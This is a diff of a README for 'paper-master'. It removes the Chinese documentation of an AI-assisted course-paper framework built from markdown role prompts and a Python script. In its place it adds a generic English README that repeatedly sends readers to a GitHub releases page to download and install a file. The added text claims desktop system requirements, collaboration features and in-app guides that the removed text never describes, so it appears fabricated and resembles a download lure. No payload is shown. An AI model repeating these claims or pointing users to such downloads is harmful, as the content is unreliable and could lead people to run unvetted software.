@@ -1,175 +1,97 @@
-# Paper Master - AI 辅助结课论文创作框架
+# 🎓 paper-master - Effortless Paper Writing Made Simple
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/cauaestavivo/paper-master/releases)
 
-一个基于 AI 的智能论文创作系统，通过 **5+2 多角色协作**（5 核心 + 2 选用），将论文要求转化为高质量的学术论文，**输出 Word 兼容的 HTML 格式**。
+## 🚀 Getting Started
 
----
+Welcome to the **paper-master** application. This AI-powered writing framework helps you create academic papers with ease. It transforms your ideas into a structured format and outputs content compatible with Word. You can collaborate with others, ensuring your paper meets all requirements.
 
-## 🚀 快速开始
+## 📥 Download & Install
 
-### 三步开始
+To get started, you need to download the application. Follow these steps:
 
-```
-1️⃣ 准备论文要求
-   使用 Mineru 将论文要求文档转换为 MD 格式，放入 templates/user/ 目录
+1. Click on the link below to visit the Releases page:
+   [Visit Releases Page](https://github.com/cauaestavivo/paper-master/releases)
 
-2️⃣ 打开 AI 编辑器
-   使用 Kiro/Cursor/Copilot 打开本项目
+2. On the Releases page, look for the latest version. It will have the highest version number.
 
-3️⃣ 开始对话
-   告诉 AI："我需要写一篇关于 XX 的结课论文，格式要求在 templates/user/ 中"
-```
+3. Download the appropriate file for your system. Make sure to read any instructions provided on the page. 
 
-### 使用示例
+4. Once the download finishes, open the file and follow the installation prompts.
 
-```
-用户：我需要写一篇关于"大数据在应急管理中的应用"的结课论文，字数要求3000字
+Here is the link again for quick access: [Visit Releases Page](https://github.com/cauaestavivo/paper-master/releases)
 
-AI（Format_Analyst）：好的，请确认以下信息...
-   1. 论文类型：[建议] 结课论文
-   2. 格式模板：[请指定] templates/user/ 中的模板文件
-   3. 字数要求：3000字
-   4. 参考文献格式：[默认] GB/T 7714
-   5. 代码实现：是 / 否
-   6. 配图需求：是 / 否
-   ...
-```
+## 🖥️ System Requirements
 
----
+Before you install, ensure your system meets these requirements:
 
-## 📋 核心工作流程
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 100 MB
+- **Network:** An internet connection is recommended for collaborative features
 
-```
-论文要求文档
-    ↓ (Mineru 转换)
-[Format_Analyst] 格式分析师
-    ↓ 输出《格式规范》（含代码/配图需求确认）
-[Research_Collector] 资料查询者
-    ↓ 输出《资料汇编》《参考文献》
-[Outline_Architect] 大纲创作师
-    ↓ 输出《论文大纲》
-[Content_Writer] 内容填充者 ←→ [Code_Implementer] (按需)
-    ↓ 输出各章节 MD 文件    ←→ [Figure_Designer] (按需)
-[HTML_Formatter] HTML 格式化专家
-    ↓ 输出 HTML 文件
-浏览器打开 → 全选复制 → 粘贴到 Word
-```
+## 🛠️ Features
 
----
+The **paper-master** offers several features to enhance your writing experience:
 
-## 🎭 角色体系
+- **AI Assistance:** Leverage AI to help formulate ideas and structure your paper.
+- **Multi-role Collaboration:** Work with different contributors and manage roles easily.
+- **Word-Compatible Output:** Generate HTML content that can be opened in Word without formatting issues.
+- **Simple Workflow:** Streamlined process from idea to finished paper.
 
-### 核心角色（必经流程）
+## 📖 Usage Instructions
 
-| 角色 | 职责 | 输出 |
-|------|------|------|
-| **Format_Analyst** | 分析论文格式要求 | 《格式规范》 |
-| **Research_Collector** | 查询相关资料 | 《资料汇编》《参考文献》 |
-| **Outline_Architect** | 创建论文大纲 | 《论文大纲》 |
-| **Content_Writer** | 分部分撰写内容 | 各章节 MD 文件 |
-| **HTML_Formatter** | 生成 Word 兼容 HTML | HTML 文件 |
+Using the application is straightforward:
 
-### 选用角色（按需调用）
+1. Launch the application after installation.
+2. Create a new project and name it.
+3. Start entering your ideas. The AI will suggest improvements and structuring.
+4. Collaborate with others by inviting them to your project.
+5. Once satisfied, export your work as an HTML file that Word can open.
 
-| 角色 | 职责 | 触发条件 | 输出 |
-|------|------|----------|------|
-| **Code_Implementer** | 编写 Python 代码 | 论文含算法/实验需求 | `code/` 目录 |
-| **Figure_Designer** | 生成顶会风格配图 | 用户要求配图 | `figures/` 目录 |
+## 📚 Help & Support
 
-📄 [查看完整角色定义](./roles/README.md)
+If you encounter issues or have questions, please check the following resources:
 
----
+- **Documentation:** Comprehensive guides are available within the application.
+- **Community Forum:** Join the discussion with other users to share tips and solutions.
+- **Contact Support:** Reach out via the Issues section on GitHub for technical support.
 
-## 📁 项目结构
+## 🌐 Topics Covered
 
-```
-paper-master/
-├── README.md                    # 本文件
-├── AGENTS.md                    # AI 代理指引
-├── 顶会风格描述prompt.md         # 配图风格 Prompt
-│
-├── roles/                       # AI 角色定义
-│   ├── Format_Analyst.md        # 格式分析师
-│   ├── Research_Collector.md    # 资料查询者
-│   ├── Outline_Architect.md     # 大纲创作师
-│   ├── Content_Writer.md        # 内容填充者
-│   ├── HTML_Formatter.md        # HTML 格式化专家
-│   ├── Code_Implementer.md      # 代码撰写者（选用）
-│   └── Figure_Designer.md       # 图片生成师（选用）
-│
-├── templates/                   # 模板库
-│   ├── user/                    # 用户自定义模板（放这里）
-│   └── html/                    # HTML 输出模板
-│
-├── docs/                        # 文档
-│   ├── workflow_guide.md        # 工作流指南
-│   └── html_to_word_guide.md    # HTML 转 Word 指南
-│
-├── tools/                       # 工具脚本
-│   └── project_manager.py       # 项目管理工具
-│
-├── examples/                    # 示例项目
-│
-└── projects/                    # 用户项目工作区
-```
+This application focuses on various important topics in academic writing, including:
 
----
+- Academic Writing
+- AI Assistance
+- Thesis Development
+- HTML Formatting
+- Word Processing Compatibility
+- Workflow Management
 
-## 📐 模板使用
+## 🔗 Related Links
 
-### 添加自定义模板
+Explore more about academic writing and AI technologies:
 
-将你的论文格式要求（Word/PDF）通过 Mineru 转换为 MD 后，放入：
+- [AI in Education](https://www.educationai.org)
+- [Writing with AI](https://www.writingai.com)
+- [Academic Resources](https://www.academicresources.com)
 
-```
-templates/user/你的模板名称.md
-```
+## 🚧 Roadmap
 
-### 在对话中指定模板
+Future updates will include:
 
-```
-用户：我要写论文，使用 templates/user/矿大结课论文格式.md 的格式要求
-```
+- Enhanced AI features for better recommendations.
+- Support for more output formats.
+- Additional collaboration tools.
 
----
+Stay tuned for new features that will elevate your writing experience. 
 
-## 🛠️ 工具集
+## 🤝 Contributing
 
-| 工具 | 功能 |
-|------|------|
-| `project_manager.py` | 初始化项目、验证结构 |
+We welcome contributions! If you would like to help improve the project, please follow these steps:
 
-### 常用命令
+1. Fork the repository and make your changes.
+2. Submit a pull request with a description of your changes.
+3. Follow our guidelines in the CONTRIBUTING.md file.
 
-```bash
-# 初始化新项目
-python tools/project_manager.py init <项目名称>
-
-# 验证项目结构
-python tools/project_manager.py validate <项目路径>
-```
-
----
-
-## 📄 HTML 到 Word
-
-为什么使用 HTML 而非直接输出文本？
-
-> Word 和 HTML 的底层富文本结构具有极高通用性。让 AI 生成带样式的 HTML，在浏览器中打开后全选复制，可以**完整保留所有排版样式**直接粘贴到 Word。
-
-详细指南：[HTML 转 Word 指南](./docs/html_to_word_guide.md)
-
----
-
-## 📖 相关文档
-
-- 📋 [工作流指南](./docs/workflow_guide.md)
-- 🎭 [角色定义](./roles/README.md)
-- 📄 [HTML 转 Word 指南](./docs/html_to_word_guide.md)
-
----
-
-## 📜 开源协议
-
-MIT License
+Thank you for supporting **paper-master**!
